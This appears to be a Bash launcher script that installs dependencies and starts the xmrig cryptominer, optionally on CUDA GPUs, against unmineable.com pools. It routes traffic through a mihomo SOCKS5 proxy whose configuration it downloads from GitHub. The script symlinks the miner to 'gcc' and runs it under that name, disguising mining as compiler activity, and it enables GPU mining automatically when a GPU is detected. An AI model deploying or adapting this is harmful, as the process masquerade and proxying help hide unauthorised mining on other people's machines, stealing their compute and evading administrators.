#!/bin/bash

set -eo pipefail

cd `dirname $0`
#----------------------------------------
function usage {
    echo "Usage: $0 -a 算法 [-p 矿池URL] [-u 用户设备] [-c] [-t 线程数]"
    echo "  算法:  rx (RandomX), gr (GhostRider)"
    echo "  -c  :  是否启用 CUDA"
}

while getopts 't:a:p:u:hcm' opt; do
    case "$opt" in
        t) NUM_THREADS=$OPTARG  ;;
        a)         ALG=$OPTARG  ;;
        p)        POOL=$OPTARG  ;;
        u)         DEV=$OPTARG  ;;
        c) CUDA=1        ;;
        m) USE_MIHOMO=1  ;;
        h) usage; exit   ;;
        *) usage; exit 1 ;;
    esac
done
#----------------------------------------
function install_app {
    if which $1 &>/dev/null; then
        echo "本地已有 $1, 无需安装"
        return
    fi
    if ! [ "$APT_UPDATED" ]; then
        sudo apt update
        APT_UPDATED=1
    fi
    sudo apt install -y $1 >/dev/null || true
    echo "安装 $1 完成"
}

install_app curl

cp -f mihomo{-$HOSTTYPE,}
chmod a+x mihomo

cp -f xmrig{-$HOSTTYPE,}
chmod a+x xmrig
ln -f -s xmrig gcc
if [ -z "$CUDA" ] && command -v nvidia-smi >/dev/null && nvidia-smi -L >/dev/null 2>&1; then
    CUDA=auto
fi
if [ "$CUDA" ]; then
    install_app libhwloc15
    install_app libuv1
    if [ -f libxmrig-cuda-$HOSTTYPE.so ]; then
        cp -f libxmrig-cuda-$HOSTTYPE.so libxmrig-cuda.so
        echo '{"cuda":{"enabled":true}}' >|config.json
    else
        echo "libxmrig-cuda-$HOSTTYPE.so not exist" >&2
    fi
fi
#--------------------------------------------------
ALG=${ALG:-}
POOL=${POOL:-}
DEV=${DEV:-shynur996.unknown}

if ! [ "$POOL" ]; then
    case $ALG in
        rx) POOL=stratum+tcp://rx.unmineable.com:3333  ;;
        gr) POOL=stratum+tcp://ghostrider.unmineable.com:3333 ;;
        *) exit 1 ;;
    esac
fi

MIHOMO_WD=`mktemp -d`
MIHOMO_PID=
function cleanup_mihomo {
    if ! [ $USE_MIHOMO ]; then
        return
    fi
    [[ -n $MIHOMO_PID ]] && kill $MIHOMO_PID 2>/dev/null || true
    rm -rf $MIHOMO_WD
}
trap cleanup_mihomo EXIT INT TERM

if [ $USE_MIHOMO ]; then
    curl -fsSL -o $MIHOMO_WD/config.yaml \
        https://raw.githubusercontent.com/shynur/HOME/refs/heads/trunk/.config/mihomo/template.yaml
    for VAR in "${!MY_MIHOMO_CFG_@}"; do
        sed -i "s|@${VAR#MY_MIHOMO_CFG_}@|${!VAR}|g" $MIHOMO_WD/config.yaml
    done
    if grep -oE '@[A-Z_]+@' $MIHOMO_WD/config.yaml; then
        echo '上述占位符缺少对应的 MY_MIHOMO_CFG_* 环境变量' >&2
        exit 1
    fi
    ./mihomo -d $MIHOMO_WD >$MIHOMO_WD/clash.log 2>&1 &
    MIHOMO_PID=$!
fi

echo '>> 启动 xmrig (stratum 经 SOCKS5) ...'
./gcc   -a $ALG   -o "$POOL"   -u $DEV   -p x    `if [ $NUM_THREADS ]; then echo "-t $NUM_THREADS"; fi`   -x 127.0.0.1:7890
